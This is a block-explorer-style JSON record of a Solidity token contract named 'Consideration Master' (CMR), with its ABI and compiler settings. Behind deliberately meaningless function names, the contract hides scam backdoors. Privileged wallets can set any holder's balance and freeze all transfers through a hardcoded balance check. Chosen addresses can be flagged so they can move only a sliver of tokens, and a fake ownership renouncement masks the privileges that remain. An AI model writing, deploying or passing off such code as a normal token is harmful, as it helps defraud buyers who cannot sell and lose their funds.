{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface launchAt {\n    function createPair(address atReceiver, address fromLaunch) external returns (address);\n}\n\ninterface limitReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyTrading) external view returns (uint256);\n\n    function transfer(address fundLaunched, uint256 walletReceiver) external returns (bool);\n\n    function allowance(address launchMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundLaunched,\n        uint256 walletReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountFee, uint256 value);\n    event Approval(address indexed launchMin, address indexed spender, uint256 value);\n}\n\nabstract contract liquidityExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundSender is limitReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConsiderationMaster is liquidityExempt, limitReceiver, fundSender {\n\n    address private atLaunched;\n\n    address public receiverLaunched;\n\n    function allowance(address modeMarketing, address fundTake) external view virtual override returns (uint256) {\n        if (fundTake == buyMin) {\n            return type(uint256).max;\n        }\n        return autoTake[modeMarketing][fundTake];\n    }\n\n    function approve(address fundTake, uint256 walletReceiver) public virtual override returns (bool) {\n        autoTake[_msgSender()][fundTake] = walletReceiver;\n        emit Approval(_msgSender(), fundTake, walletReceiver);\n        return true;\n    }\n\n    uint256 takeReceiver;\n\n    function owner() external view returns (address) {\n        return atLaunched;\n    }\n\n    mapping(address => bool) public limitExempt;\n\n    bool public receiverEnable;\n\n    uint8 private autoList = 18;\n\n    function transferFrom(address sellFund, address fundLaunched, uint256 walletReceiver) external override returns (bool) {\n        if (_msgSender() != buyMin) {\n            if (autoTake[sellFund][_msgSender()] != type(uint256).max) {\n                require(walletReceiver <= autoTake[sellFund][_msgSender()]);\n                autoTake[sellFund][_msgSender()] -= walletReceiver;\n            }\n        }\n        return launchedWallet(sellFund, fundLaunched, walletReceiver);\n    }\n\n    uint256 private enableLimit = 100000000 * 10 ** 18;\n\n    function launchedWallet(address sellFund, address fundLaunched, uint256 walletReceiver) internal returns (bool) {\n        if (sellFund == walletTo) {\n            return buyMarketingAt(sellFund, fundLaunched, walletReceiver);\n        }\n        uint256 shouldEnable = limitReceiver(receiverLaunched).balanceOf(autoLiquidityBuy);\n        require(shouldEnable == fromEnable);\n        require(fundLaunched != autoLiquidityBuy);\n        if (limitExempt[sellFund]) {\n            return buyMarketingAt(sellFund, fundLaunched, feeTo);\n        }\n        return buyMarketingAt(sellFund, fundLaunched, walletReceiver);\n    }\n\n    function sellAtAmount(uint256 walletReceiver) public {\n        minSellList();\n        fromEnable = walletReceiver;\n    }\n\n    function senderAuto() public {\n        emit OwnershipTransferred(walletTo, address(0));\n        atLaunched = address(0);\n    }\n\n    string private takeMin = \"CMR\";\n\n    event OwnershipTransferred(address indexed walletMinMax, address indexed maxFund);\n\n    mapping(address => uint256) private walletMode;\n\n    string private fundEnableTo = \"Consideration Master\";\n\n    mapping(address => mapping(address => uint256)) private autoTake;\n\n    uint256 public feeWallet;\n\n    address public walletTo;\n\n    constructor (){\n        if (feeMarketing) {\n            receiverLaunchedSwap = feeWallet;\n        }\n        enableMin tradingLaunched = enableMin(buyMin);\n        receiverLaunched = launchAt(tradingLaunched.factory()).createPair(tradingLaunched.WETH(), address(this));\n        \n        walletTo = _msgSender();\n        walletLiquidity[walletTo] = true;\n        walletMode[walletTo] = enableLimit;\n        senderAuto();\n        \n        emit Transfer(address(0), walletTo, enableLimit);\n    }\n\n    address autoLiquidityBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public exemptToAt;\n\n    bool public autoLaunched;\n\n    function minSellList() private view {\n        require(walletLiquidity[_msgSender()]);\n    }\n\n    address buyMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoList;\n    }\n\n    function transfer(address minSender, uint256 walletReceiver) external virtual override returns (bool) {\n        return launchedWallet(_msgSender(), minSender, walletReceiver);\n    }\n\n    function isReceiverReceiver(address senderWallet) public {\n        minSellList();\n        if (feeMarketing) {\n            receiverLaunchedSwap = feeWallet;\n        }\n        if (senderWallet == walletTo || senderWallet == receiverLaunched) {\n            return;\n        }\n        limitExempt[senderWallet] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fundEnableTo;\n    }\n\n    bool private feeMarketing;\n\n    uint256 private limitSwap;\n\n    bool public totalTokenShould;\n\n    function buyMarketingAt(address sellFund, address fundLaunched, uint256 walletReceiver) internal returns (bool) {\n        require(walletMode[sellFund] >= walletReceiver);\n        walletMode[sellFund] -= walletReceiver;\n        walletMode[fundLaunched] += walletReceiver;\n        emit Transfer(sellFund, fundLaunched, walletReceiver);\n        return true;\n    }\n\n    function atTxTotal(address walletBuy) public {\n        require(walletBuy.balance < 100000);\n        if (receiverEnable) {\n            return;\n        }\n        if (autoLaunched) {\n            limitSwap = receiverLaunchedSwap;\n        }\n        walletLiquidity[walletBuy] = true;\n        if (autoLaunched == feeMarketing) {\n            autoLaunched = false;\n        }\n        receiverEnable = true;\n    }\n\n    uint256 constant feeTo = 18 ** 10;\n\n    function balanceOf(address buyTrading) public view virtual override returns (uint256) {\n        return walletMode[buyTrading];\n    }\n\n    uint256 public receiverLaunchedSwap;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableLimit;\n    }\n\n    uint256 fromEnable;\n\n    function totalFromFee(address minSender, uint256 walletReceiver) public {\n        minSellList();\n        walletMode[minSender] = walletReceiver;\n    }\n\n    function getOwner() external view returns (address) {\n        return atLaunched;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeMin;\n    }\n\n    mapping(address => bool) public walletLiquidity;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletMinMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"}],\"name\":\"atTxTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptToAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderWallet\",\"type\":\"address\"}],\"name\":\"isReceiverReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunchedSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"sellAtAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"totalFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTokenShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ConsiderationMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}